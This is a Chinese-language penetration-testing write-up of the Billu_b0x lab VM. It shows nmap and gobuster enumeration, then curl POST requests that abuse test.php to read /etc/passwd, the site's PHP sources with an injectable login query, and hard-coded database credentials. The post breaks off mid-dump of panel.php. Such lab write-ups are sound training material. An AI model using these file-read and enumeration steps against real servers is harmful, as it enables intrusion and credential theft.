    <content type="html"><![CDATA[<p>这台靶机包含的内容比较多，信息收集、本地文件读取、代码审计、SQL 注入等，需要具有比较全面的安全知识，并且要对网站的目录结构和逻辑有较为清晰的认识，才能在打靶机的过程中游刃有余，从而形成自己的渗透思路。</p><h1 id="Billu-b0x-靶机"><a href="#Billu-b0x-靶机" class="headerlink" title="Billu_b0x 靶机"></a>Billu_b0x 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap 扫描</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> sudo nmap <span class="hljs-literal">-sT</span> <span class="hljs-literal">-sV</span> <span class="hljs-literal">-sC</span> <span class="hljs-literal">-p22</span>,<span class="hljs-number">80</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> <br>Starting Nmap <span class="hljs-number">7.92</span> ( https://nmap.org ) at <span class="hljs-number">2023</span><span class="hljs-literal">-05-24</span> <span class="hljs-number">04</span>:<span class="hljs-number">30</span> EDT<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span><br>Host is up (<span class="hljs-number">0.00024</span>s latency).<br><br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">5.9</span>p1 Debian <span class="hljs-number">5</span>ubuntu1.<span class="hljs-number">4</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| ssh<span class="hljs-literal">-hostkey</span>: <br>|   <span class="hljs-number">1024</span> fa:cf:a2:<span class="hljs-number">52</span>:c4:fa:f5:<span class="hljs-number">75</span>:a7:e2:bd:<span class="hljs-number">60</span>:<span class="hljs-number">83</span>:<span class="hljs-number">3</span>e:<span class="hljs-number">7</span>b:de (DSA)<br>|   <span class="hljs-number">2048</span> <span class="hljs-number">88</span>:<span class="hljs-number">31</span>:<span class="hljs-number">0</span>c:<span class="hljs-number">78</span>:<span class="hljs-number">98</span>:<span class="hljs-number">80</span>:ef:<span class="hljs-number">33</span>:fa:<span class="hljs-number">26</span>:<span class="hljs-number">22</span>:ed:d0:<span class="hljs-number">9</span>b:ba:f8 (RSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">0</span>e:<span class="hljs-number">5</span>e:<span class="hljs-number">33</span>:<span class="hljs-number">03</span>:<span class="hljs-number">50</span>:c9:<span class="hljs-number">1</span>e:b3:e7:<span class="hljs-number">51</span>:<span class="hljs-number">39</span>:a4:<span class="hljs-number">4</span>a:<span class="hljs-number">10</span>:<span class="hljs-number">64</span>:ca (ECDSA)<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.2</span>.<span class="hljs-number">22</span> ((Ubuntu))<br>| http<span class="hljs-literal">-cookie-flags</span>: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>|_http<span class="hljs-literal">-title</span>: <span class="hljs-literal">--</span>==[[<span class="hljs-type">Indipowershell</span> <span class="hljs-type">Lab</span>]]==<span class="hljs-literal">--</span><br>|_http<span class="hljs-literal">-server-header</span>: Apache/<span class="hljs-number">2.2</span>.<span class="hljs-number">22</span> (Ubuntu)<br>MAC Address: <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:A9:A2:<span class="hljs-number">24</span> (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">6.88</span> seconds<br><br>┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> sudo nmap <span class="hljs-literal">--script</span>=vuln <span class="hljs-literal">-p22</span>,<span class="hljs-number">80</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span><br>Starting Nmap <span class="hljs-number">7.92</span> ( https://nmap.org ) at <span class="hljs-number">2023</span><span class="hljs-literal">-05-24</span> <span class="hljs-number">04</span>:<span class="hljs-number">32</span> EDT<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span><br>Host is up (<span class="hljs-number">0.00028</span>s latency).<br><br>PORT   STATE SERVICE<br><span class="hljs-number">22</span>/tcp open  ssh<br><span class="hljs-number">80</span>/tcp open  http<br>|_http<span class="hljs-literal">-dombased-xss</span>: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.<br>| http<span class="hljs-literal">-cookie-flags</span>: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>| http<span class="hljs-literal">-enum</span>: <br>|   /test.php: Test page<br>|_  /images/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.2.22 (ubuntu)&#x27;</span><br>| http<span class="hljs-literal">-internal-ip-disclosure</span>: <br>|_  Internal IP Leaked: <span class="hljs-number">127.0</span>.<span class="hljs-number">1.1</span><br>|_http<span class="hljs-literal">-stored-xss</span>: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">MAC Address: 00:0C:29:A9:A2:24 (VMware)</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 32.03 seconds</span><br></code></pre></td></tr></table></figure><p>似乎没有得到特别有效的信息，倒是有个特殊的文件 test.php 那就进入 web 查看环节吧</p><h2 id="Web-服务查看"><a href="#Web-服务查看" class="headerlink" title="Web 服务查看"></a>Web 服务查看</h2><p>首先看看 80 端口，是一个登录界面，感觉可能存在 sql 注入，尝试使用’符号来注入，失败。接下来分别使用了常用的”,},)进行闭合，似乎简单的注入并没有用，可能是存在过滤或者替换吧，目录爆破看看吧 </p><p><img src="/pic/cbef8013431f8f2800f8b83e9c1e628b_MD5.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> sudo gobuster <span class="hljs-built_in">dir</span> <span class="hljs-literal">-u</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/ <span class="hljs-literal">-w</span> /usr/share/wordlists/dirbuster/directory<span class="hljs-literal">-list-2</span>.<span class="hljs-number">3</span><span class="hljs-literal">-medium</span>.txt <span class="hljs-literal">-x</span> php,txt,html <span class="hljs-literal">-t</span> <span class="hljs-number">64</span><br>[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> kali: <br>===============================================================<br>Gobuster v3.<span class="hljs-number">2.0</span><span class="hljs-literal">-dev</span><br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/<br>[+] Method:                  GET<br>[+] Threads:                 <span class="hljs-number">64</span><br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory<span class="hljs-literal">-list-2</span>.<span class="hljs-number">3</span><span class="hljs-literal">-medium</span>.txt<br>[+] Negative Status codes:   <span class="hljs-number">404</span><br>[+] User Agent:              gobuster/<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span><span class="hljs-literal">-dev</span><br>[+] Extensions:              html,php,txt<br>[+] Timeout:                 <span class="hljs-number">10</span>s<br>===============================================================<br><span class="hljs-number">2023</span>/<span class="hljs-number">05</span>/<span class="hljs-number">24</span> <span class="hljs-number">05</span>:<span class="hljs-number">13</span>:<span class="hljs-number">15</span> Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index                (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">3267</span>]<br>/images               (Status: <span class="hljs-number">301</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">313</span>] [--&gt; <span class="hljs-type">http</span>://<span class="hljs-number">10.10</span><span class="hljs-type">.10.161</span>/<span class="hljs-type">images</span>/]<br>/index.php            (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">3267</span>]<br>/c.php                (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">1</span>]<br>/c                    (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">1</span>]<br>/in.php               (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">47526</span>]<br>/<span class="hljs-keyword">in</span>                   (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">47522</span>]<br>/show                 (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">1</span>]<br>/show.php             (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">1</span>]<br>/add.php              (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">307</span>]<br>/add                  (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">307</span>]<br>/test                 (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">72</span>]<br>/test.php             (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">72</span>]<br>/.html                (Status: <span class="hljs-number">403</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">285</span>]<br>/head.php             (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">2793</span>]<br>/head                 (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">2793</span>]<br>/uploaded_images      (Status: <span class="hljs-number">301</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">322</span>] [--&gt; <span class="hljs-type">http</span>://<span class="hljs-number">10.10</span><span class="hljs-type">.10.161</span>/<span class="hljs-type">uploaded_images</span>/]                                                                                      <br>/panel                (Status: <span class="hljs-number">302</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">2469</span>] [--&gt; <span class="hljs-type">index.php</span>]<br>/panel.php            (Status: <span class="hljs-number">302</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">2469</span>] [--&gt; <span class="hljs-type">index.php</span>]<br>/head2                (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">2468</span>]<br>/head2.php            (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">2468</span>]<br>/.html                (Status: <span class="hljs-number">403</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">285</span>]<br>/server<span class="hljs-literal">-status</span>        (Status: <span class="hljs-number">403</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">293</span>]<br>Progress: <span class="hljs-number">879939</span> / <span class="hljs-number">882244</span> (<span class="hljs-number">99.74</span>%)===============================================================<br><span class="hljs-number">2023</span>/<span class="hljs-number">05</span>/<span class="hljs-number">24</span> <span class="hljs-number">05</span>:<span class="hljs-number">16</span>:<span class="hljs-number">07</span> Finished<br>===============================================================<br><br></code></pre></td></tr></table></figure><p>确实有些有意思的目录，images，c，show，add，test，head，uploaded_images，panel，head2.php，挨个查看<br>images 目录<br><img src="/pic/e95e3608674cd1bdda207590df01467b_MD5.png"><br>add 目录，尝试 add 上传图片但是失败，并没有在 uploaded_images 中看到上传的文件<br><img src="/pic/5b518a1330c189395ffc4a7e8da149de_MD5.png"><br>uploaded_images 目录，这里的 1.jpg 是后面的后面才上传成功的，与刚才直接尝试上传无关<br><img src="/pic/87d9319a7ff9b6f3c36c6e1f52cc3a04_MD5.png"><br>c, show 无回显，panel 返回到登录界面<br>test. php<br><img src="/pic/a2753f261c0e728fb2c5db739b813bf9_MD5.png"></p><p>提示缺少参数 file，尝试在 url 中添加<br><img src="/pic/ed3faeeb3039d77dd1b1a62097275521_MD5.png"><br>失败，那就尝试使用 POST 方法</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST <span class="hljs-literal">--data</span> <span class="hljs-string">&quot;file=/etc/passwd&quot;</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/test.php<br>root:x:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:root:/root:/bin/bash<br>daemon:x:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>:daemon:/usr/sbin:/bin/sh<br>bin:x:<span class="hljs-number">2</span>:<span class="hljs-number">2</span>:bin:/bin:/bin/sh<br>sys:x:<span class="hljs-number">3</span>:<span class="hljs-number">3</span>:sys:/dev:/bin/sh<br>sync:x:<span class="hljs-number">4</span>:<span class="hljs-number">65534</span>:sync:/bin:/bin/sync<br>games:x:<span class="hljs-number">5</span>:<span class="hljs-number">60</span>:games:/usr/games:/bin/sh<br><span class="hljs-built_in">man</span>:x:<span class="hljs-number">6</span>:<span class="hljs-number">12</span>:<span class="hljs-built_in">man</span>:/var/cache/<span class="hljs-built_in">man</span>:/bin/sh<br><span class="hljs-built_in">lp</span>:x:<span class="hljs-number">7</span>:<span class="hljs-number">7</span>:<span class="hljs-built_in">lp</span>:/var/spool/lpd:/bin/sh<br>mail:x:<span class="hljs-number">8</span>:<span class="hljs-number">8</span>:mail:/var/mail:/bin/sh<br>news:x:<span class="hljs-number">9</span>:<span class="hljs-number">9</span>:news:/var/spool/news:/bin/sh<br>uucp:x:<span class="hljs-number">10</span>:<span class="hljs-number">10</span>:uucp:/var/spool/uucp:/bin/sh<br>proxy:x:<span class="hljs-number">13</span>:<span class="hljs-number">13</span>:proxy:/bin:/bin/sh<br>www<span class="hljs-literal">-data</span>:x:<span class="hljs-number">33</span>:<span class="hljs-number">33</span>:www<span class="hljs-literal">-data</span>:/var/www:/bin/sh<br>backup:x:<span class="hljs-number">34</span>:<span class="hljs-number">34</span>:backup:/var/backups:/bin/sh<br>list:x:<span class="hljs-number">38</span>:<span class="hljs-number">38</span>:Mailing List Manager:/var/list:/bin/sh<br>irc:x:<span class="hljs-number">39</span>:<span class="hljs-number">39</span>:ircd:/var/run/ircd:/bin/sh<br>gnats:x:<span class="hljs-number">41</span>:<span class="hljs-number">41</span>:Gnats Bug<span class="hljs-literal">-Reporting</span> System (admin):/var/lib/gnats:/bin/sh<br>nobody:x:<span class="hljs-number">65534</span>:<span class="hljs-number">65534</span>:nobody:/nonexistent:/bin/sh<br>libuuid:x:<span class="hljs-number">100</span>:<span class="hljs-number">101</span>::/var/lib/libuuid:/bin/sh<br>syslog:x:<span class="hljs-number">101</span>:<span class="hljs-number">103</span>::/home/syslog:/bin/false<br>mysql:x:<span class="hljs-number">102</span>:<span class="hljs-number">105</span>:MySQL Server,,,:/nonexistent:/bin/false<br>messagebus:x:<span class="hljs-number">103</span>:<span class="hljs-number">106</span>::/var/run/dbus:/bin/false<br>whoopsie:x:<span class="hljs-number">104</span>:<span class="hljs-number">107</span>::/nonexistent:/bin/false<br>landscape:x:<span class="hljs-number">105</span>:<span class="hljs-number">110</span>::/var/lib/landscape:/bin/false<br>sshd:x:<span class="hljs-number">106</span>:<span class="hljs-number">65534</span>::/var/run/sshd:/usr/sbin/nologin<br>ica:x:<span class="hljs-number">1000</span>:<span class="hljs-number">1000</span>:ica,,,:/home/ica:/bin/bash<br></code></pre></td></tr></table></figure><p>得到了一些用户信息，验证了存在远程文件包含漏洞。接下来我们利用目录爆破的结果获取一下几个文件的内容<br>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php">┌──(kali㉿kali)-[~]<br>└─$ curl -X POST --data <span class="hljs-string">&quot;file=./index.php&quot;</span> http:<span class="hljs-comment">//10.10.10.161/test.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;c.php&#x27;</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;head.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(@<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged&#x27;</span>]!=<span class="hljs-literal">true</span>)<br>&#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged&#x27;</span>]=<span class="hljs-string">&#x27;&#x27;</span>;<br><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged&#x27;</span>]==<span class="hljs-literal">true</span> &amp;&amp;  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]!=<span class="hljs-string">&#x27;&#x27;</span>)<br>&#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are logged in :)&quot;</span>;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: panel.php&#x27;</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">302</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=center style=&quot;margin:30px 0px 0px 0px;&quot;&gt;</span><br><span class="hljs-string">&lt;font size=8 face=&quot;comic sans ms&quot;&gt;--==[[ billu b0x ]]==--&lt;/font&gt; </span><br><span class="hljs-string">&lt;br&gt;&lt;br&gt;</span><br><span class="hljs-string">Show me your SQLI skills &lt;br&gt;</span><br><span class="hljs-string">&lt;form method=post&gt;</span><br><span class="hljs-string">Username :- &lt;Input type=text name=un&gt; &amp;nbsp Password:- &lt;input type=password name=ps&gt; &lt;br&gt;&lt;br&gt;</span><br><span class="hljs-string">&lt;input type=submit name=login value=&quot;let\&#x27;s login&quot;&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;login&#x27;</span>]))<br>&#123;<br>        <span class="hljs-variable">$uname</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;un&#x27;</span>]));<br>        <span class="hljs-variable">$pass</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ps&#x27;</span>]));<br>        <span class="hljs-variable">$run</span>=<span class="hljs-string">&#x27;select * from auth where  pass=\&#x27;&#x27;</span>.<span class="hljs-variable">$pass</span>.<span class="hljs-string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="hljs-variable">$uname</span>.<span class="hljs-string">&#x27;\&#x27;&#x27;</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$run</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$result</span>) &gt; <span class="hljs-number">0</span>) &#123;<br><br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>(<span class="hljs-variable">$result</span>);<br>           <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are allowed&lt;br&gt;&quot;</span>;<br>           <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged&#x27;</span>]=<span class="hljs-literal">true</span>;<br>           <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]=<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>           <br>         <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: panel.php&#x27;</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">302</span>);<br>   <br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Try again&#x27;);&lt;/script&gt;&quot;</span>;<br>&#125;<br><br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;font size=5 face=\&quot;comic sans ms\&quot; style=\&quot;left: 0;bottom: 0; position: absolute;margin: 0px 0px 5px;\&quot;&gt;B0X Powered By &lt;font color=#ff9933&gt;Pirates&lt;/font&gt; &quot;</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>c.php，有个密码，尝试 ssh 登录，但是失败</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> sudo <span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST <span class="hljs-literal">--data</span> <span class="hljs-string">&quot;file=./c.php&quot;</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/test.php<br>[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> kali: <br>&lt;?php<br><span class="hljs-comment">#header( &#x27;Z-Powered-By:its chutiyapa xD&#x27; );</span><br>header(<span class="hljs-string">&#x27;X-Frame-Options: SAMEORIGIN&#x27;</span>);<br>header( <span class="hljs-string">&#x27;Server:testing only&#x27;</span> );<br>header( <span class="hljs-string">&#x27;X-Powered-By:testing only&#x27;</span> );<br><br>ini_set( <span class="hljs-string">&#x27;session.cookie_httponly&#x27;</span>, <span class="hljs-number">1</span> );<br><br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;billu&quot;</span>,<span class="hljs-string">&quot;b0x_billu&quot;</span>,<span class="hljs-string">&quot;ica_lab&quot;</span>);<br><br>// Check connection<br><span class="hljs-keyword">if</span> (mysqli_connect_errno())<br>  &#123;<br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;connection failed -&gt;  &quot;</span> . mysqli_connect_error();<br>  &#125;<br><br>?&gt;<br><br></code></pre></td></tr></table></figure><p>panel.php</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> sudo <span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST <span class="hljs-literal">--data</span> <span class="hljs-string">&quot;file=./panel.php&quot;</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/test.php<br>&lt;?php<br>session_start();<br><br>include(<span class="hljs-string">&#x27;c.php&#x27;</span>);<br>include(<span 